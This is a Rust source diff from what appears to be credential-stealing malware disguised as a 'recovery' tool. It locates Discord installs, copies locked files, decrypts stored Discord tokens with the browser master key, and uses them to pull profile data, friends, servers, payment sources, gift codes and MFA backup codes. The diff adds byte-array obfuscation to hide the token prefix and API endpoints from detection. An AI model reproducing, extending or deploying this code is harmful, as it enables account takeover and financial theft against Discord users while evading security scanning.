@@ -1,6 +1,7 @@
 use crate::recovery::browser::chromium::extract_master_key;
 use crate::recovery::browser::lockedfile::copy_locked_file;
 use crate::recovery::context::RecoveryContext;
+use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::output::write_json_artifact;
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use aes_gcm::aead::Aead;
@@ -25,11 +26,11 @@ pub fn discord_token_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
 }
 
 pub struct DiscordTokenTask {
-    roots: Vec<(String, PathBuf)> 
+    roots: Vec<(String, PathBuf)>,
 }
 
 static DISCORD_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> = Lazy::new(OnceCell::new);
-static DISCORD_PROFILE_CACHE: Lazy<OnceCell<Arc<Vec<DiscordProfileRecord>>>> = 
+static DISCORD_PROFILE_CACHE: Lazy<OnceCell<Arc<Vec<DiscordProfileRecord>>>> =
     Lazy::new(OnceCell::new);
 
 impl DiscordTokenTask {
@@ -43,7 +44,7 @@ impl DiscordTokenTask {
 fn discord_roots(ctx: &RecoveryContext) -> Vec<(String, PathBuf)> {
     let mut result = Vec::new();
     let base = ctx.roaming_data_dir.clone();
-    
+
     let variants = [
         ("Discord", "Discord.exe"),
         ("discordcanary", "DiscordCanary.exe"),
@@ -82,19 +83,29 @@ fn decrypt_discord_token(value: &str, master_key: &[u8]) -> Result<String, Recov
         .map_err(|err| RecoveryError::Custom(format!("token decrypt failed: {err}")))?;
 
     String::from_utf8(decrypted)
-        .map_err(|err| RecoveryError::Custom(format!("token utf8 decode failed: {err}"))) 
+        .map_err(|err| RecoveryError::Custom(format!("token utf8 decode failed: {err}")))
 }
 
-async fn read_safe(proc_name: &str, path: &Path, temp_dir: &Path) -> Result<Vec<u8>, RecoveryError> {
+async fn read_safe(
+    proc_name: &str,
+    path: &Path,
+    temp_dir: &Path,
+) -> Result<Vec<u8>, RecoveryError> {
     if !path.exists() {
-        return Err(RecoveryError::Io(std::io::Error::new(std::io::ErrorKind::NotFound, "file not found")));
+        return Err(RecoveryError::Io(std::io::Error::new(
+            std::io::ErrorKind::NotFound,
+            "file not found",
+        )));
     }
 
     if let Ok(data) = fs::read(path).await {
         return Ok(data);
     }
 
-    let temp_file = temp_dir.join(path.file_name().unwrap_or_else(|| std::ffi::OsStr::new("temp")));
+    let temp_file = temp_dir.join(
+        path.file_name()
+            .unwrap_or_else(|| std::ffi::OsStr::new("temp")),
+    );
     if copy_locked_file(proc_name, path, &temp_file) {
         let data = fs::read(&temp_file).await.map_err(RecoveryError::Io)?;
         let _ = fs::remove_file(&temp_file).await;
@@ -115,11 +126,11 @@ async fn collect_tokens_for_path(
     let master_key = if local_state.exists() {
         let temp_ls = temp_dir.join("Local State");
         if copy_locked_file(proc_name, &local_state, &temp_ls) {
-             let key = extract_master_key(&temp_ls)?;
-             let _ = fs::remove_file(&temp_ls).await;
-             key
+            let key = extract_master_key(&temp_ls)?;
+            let _ = fs::remove_file(&temp_ls).await;
+            key
         } else {
-             extract_master_key(&local_state)?
+            extract_master_key(&local_state)?
         }
     } else {
         None
@@ -140,7 +151,7 @@ async fn collect_tokens_for_path(
                     continue;
                 }
             }
-            
+
             if let Ok(data) = read_safe(proc_name, &entry.path(), &temp_dir).await {
                 if let Ok(mut found) = scan_bytes_for_tokens(&data) {
                     tokens.extend(found.drain());
@@ -148,7 +159,7 @@ async fn collect_tokens_for_path(
             }
         }
     }
-    
+
     let _ = fs::remove_dir_all(&temp_dir).await;
     Ok((master_key, tokens))
 }
@@ -204,13 +215,16 @@ async fn gather_discord_token_records(
 }
 
 fn scan_bytes_for_tokens(buffer: &[u8]) -> Result<HashSet<String>, RecoveryError> {
-    const PREFIX: &[u8] = b"dQw4w9WgXcQ:";
+    let prefix_str = deobf(&[
+        0xD3, 0xEE, 0x80, 0x8D, 0x80, 0x8E, 0xAA, 0x80, 0xDB, 0xE1, 0x9B, 0x80, 0x8D, 0xAF,
+    ]);
+    let prefix = prefix_str.as_bytes();
     let mut tokens = HashSet::new();
     let mut cursor = 0usize;
 
-    while cursor + PREFIX.len() <= buffer.len() {
-        if &buffer[cursor..cursor + PREFIX.len()] == PREFIX {
-            let search_start = cursor + PREFIX.len();
+    while cursor + prefix.len() <= buffer.len() {
+        if &buffer[cursor..cursor + prefix.len()] == prefix {
+            let search_start = cursor + prefix.len();
             if let Some(rel_end) = buffer[search_start..].iter().position(|&b| b == b'"') {
                 let end = search_start + rel_end;
                 if let Ok(token) = std::str::from_utf8(&buffer[cursor..end]) {
@@ -348,7 +362,7 @@ pub fn discord_profile_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
 }
 
 pub struct DiscordProfileTask {
-    roots: Vec<(String, PathBuf)> 
+    roots: Vec<(String, PathBuf)>,
 }
 
 impl DiscordProfileTask {
@@ -374,8 +388,10 @@ impl DiscordApiClient {
     }
 
     async fn populate_record(&self, record: &mut DiscordProfileRecord) {
+        // "/users/@me"
+        let me_ep = deobf(&[0xAF, 0x88, 0xCE, 0xD8, 0xCF, 0xCE, 0xAF, 0xF3, 0xD0, 0xD8]);
         match self
-            .request_discord_endpoint::<DiscordUser>(&record.token, "/users/@me")
+            .request_discord_endpoint::<DiscordUser>(&record.token, &me_ep)
             .await
         {
             Ok(Some(user)) => record.user = Some(user.into()),
@@ -383,11 +399,13 @@ impl DiscordApiClient {
             Err(err) => record.errors.push(err),
         }
 
+        // "/users/@me/relationships"
+        let rel_ep = deobf(&[
+            0xAF, 0x88, 0xCE, 0xD8, 0xCF, 0xCE, 0xAF, 0xF3, 0xD0, 0xD8, 0xAF, 0xCF, 0xD8, 0xDB,
+            0xDA, 0xD9, 0xD4, 0xCF, 0xCE, 0xD0, 0xD2, 0xD3, 0xEE, 0xD4, 0xCB, 0xCE,
+        ]);
         match self
-            .request_discord_endpoint::<Vec<DiscordRelationship>>(
-                &record.token,
-                "/users/@me/relationships",
-            )
+            .request_discord_endpoint::<Vec<DiscordRelationship>>(&record.token, &rel_ep)
             .await
         {
             Ok(Some(relationships)) => {
@@ -408,8 +426,13 @@ impl DiscordApiClient {
             Err(err) => record.errors.push(err),
         }
 
+        // "/users/@me/guilds"
+        let guilds_ep = deobf(&[
+            0xAF, 0x88, 0xCE, 0xD8, 0xCF, 0xCE, 0xAF, 0xF3, 0xD0, 0xD8, 0xAF, 0xDA, 0x88, 0xD4,
+            0xDB, 0xDB, 0xCF, 0xCE,
+        ]);
         match self
-            .request_discord_endpoint::<Vec<DiscordGuild>>(&record.token, "/users/@me/guilds")
+            .request_discord_endpoint::<Vec<DiscordGuild>>(&record.token, &guilds_ep)
             .await
         {
             Ok(Some(guilds)) => {
@@ -426,11 +449,14 @@ impl DiscordApiClient {
             Err(err) => record.errors.push(err),
         }
 
+        // "/users/@me/billing/payment-sources"
+        let billing_ep = deobf(&[
+            0xAF, 0x88, 0xCE, 0xD8, 0xCF, 0xCE, 0xAF, 0xF3, 0xD0, 0xD8, 0xAF, 0xDB, 0xD4, 0xDB,
+            0xDB, 0xD4, 0xCE, 0xDA, 0xAF, 0x8D, 0xDA, 0xCC, 0x90, 0xD8, 0xCF, 0xCE, 0xAF, 0xCF,
+            0xCB, 0xC8, 0xCF, 0xDA, 0xD8, 0xCE,
+        ]);
         match self
-            .request_discord_endpoint::<Vec<DiscordBillingSource>>(
-                &record.token,
-                "/users/@me/billing/payment-sources",
-            )
+            .request_discord_endpoint::<Vec<DiscordBillingSource>>(&record.token, &billing_ep)
             .await
         {
             Ok(Some(sources)) => record.billing_sources = sources,
@@ -438,15 +464,20 @@ impl DiscordApiClient {
             Err(err) => record.errors.push(err),
         }
 
+        // "/users/@me/entitlements/gift-codes"
+        let gifts_ep = deobf(&[
+            0xAF, 0x88, 0xCE, 0xD8, 0xCF, 0xCE, 0xAF, 0xF3, 0xD0, 0xD8, 0xAF, 0xD8, 0xCF, 0xCE,
+            0xD4, 0xCE, 0xDB, 0xD8, 0x90, 0xD8, 0xCF, 0xCE, 0x90, 0xAF, 0xDA, 0xD4, 0xDF, 0xCE,
+            0xAF, 0xDA, 0xD2, 0xDB, 0xD8, 0xCE,
+        ]);
         match self
-            .request_discord_endpoint::<Vec<DiscordGiftCode>>(
-                &record.token,
-                "/users/@me/entitlements/gift-codes",
-            )
+            .request_discord_endpoint::<Vec<DiscordGiftCode>>(&record.token, &gifts_ep)
             .await
         {
             Ok(Some(gifts)) => record.gift_codes = gifts,
-            Ok(None) => record.errors.push("gift codes endpoint unauthorized".into()),
+            Ok(None) => record
+                .errors
+                .push("gift codes endpoint unauthorized".into()),
             Err(err) => record.errors.push(err),
         }
     }
@@ -455,11 +486,16 @@ impl DiscordApiClient {
         &self,
         token: &str,
         endpoint: &str,
-    ) -> Result<Option<T>, String> 
+    ) -> Result<Option<T>, String>
     where
         T: DeserializeOwned,
     {
-        let url = format!("https://discord.com/api/v10{endpoint}");
+        // "https://discord.com/api/v10"
+        let base_url = deobf(&[
+            0xD5, 0xC9, 0xC9, 0xCD, 0xCE, 0x87, 0x92, 0x92, 0xDB, 0xD4, 0xCE, 0xDA, 0xD2, 0xCF,
+            0xDB, 0x93, 0xDA, 0xD2, 0xDB, 0xAF, 0xDA, 0xCD, 0xD4, 0xAF, 0xC1, 0x8C, 0x8D,
+        ]);
+        let url = format!("{}{}", base_url, endpoint);
         let response = self
             .client
             .get(&url)
@@ -499,8 +535,9 @@ async fn collect_discord_profiles_inner(
         let mut profile = DiscordProfileRecord::new(source.clone(), token);
         api.populate_record(&mut profile).await;
 
-        if let Some((proc_name, root_path)) =
-            roots.iter().find(|(_, r)| r.display().to_string() == source)
+        if let Some((proc_name, root_path)) = roots
+            .iter()
+            .find(|(_, r)| r.display().to_string() == source)
         {
             profile.mfa_backup_codes = collect_mfa_codes(proc_name, root_path).await;
         }
@@ -721,7 +758,7 @@ pub fn discord_service_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
 }
 
 struct DiscordServiceTask {
-    roots: Vec<(String, PathBuf)> 
+    roots: Vec<(String, PathBuf)>,
 }
 
 impl DiscordServiceTask {
